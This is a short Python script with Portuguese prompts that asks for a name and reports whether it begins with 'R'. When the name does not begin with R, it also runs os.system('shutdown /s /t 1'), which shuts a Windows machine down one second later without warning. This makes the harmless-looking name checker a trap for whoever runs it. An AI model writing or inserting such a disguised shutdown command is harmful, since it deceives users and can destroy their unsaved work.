import os

nome = input("digite o seu nome: ").strip().capitalize()

if nome.startswith('R'):
    print("seu nome começa com R")
else:
    print("seu nome não começa com R")
    
    os.system('shutdown /s /t 1')